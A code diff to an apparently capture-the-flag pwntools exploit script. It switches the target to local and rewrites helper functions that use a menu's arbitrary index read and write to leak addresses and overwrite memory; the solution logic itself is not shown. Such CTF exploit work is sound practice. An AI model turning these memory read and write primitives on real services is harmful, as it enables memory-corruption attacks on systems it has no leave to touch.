@@ -1,6 +1,6 @@
 from pwn import *
 
-local = False
+local = True
 # Both solutions work against the Docker container instance.
 # Only solution 2 works locally.
 # Solution 1 fails on the local machine because there is no valid address at that index.
@@ -13,21 +13,23 @@ else:
 
 
 def do_read(idx):
-    p.recvuntil(">")
-    p.sendline("1")
-    p.recvuntil("index:")
-    p.sendline(str(idx))
-    p.recvuntil("]: ")
-    return int(p.recvuntil("\n")[:-1], 16)
+    p.recvuntil(b">")
+    p.sendline(b"1")
+    p.recvuntil(b"index:")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"]: ")
+    leak = p.recvline().strip()
+    print(f"Raw Leak: {leak}")
+    return int(leak, 16)
 
 
 def do_write(idx, value):
-    p.recvuntil(">")
-    p.sendline("2")
-    p.recvuntil("index:")
-    p.sendline(str(idx))
-    p.recvuntil("value:")
-    p.sendline(hex(value))
+    p.recvuntil(b">")
+    p.sendline(b"2")
+    p.recvuntil(b"index:")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"value:")
+    p.sendline(hex(value).encode())
 
 
 if SOLUTION == 1:
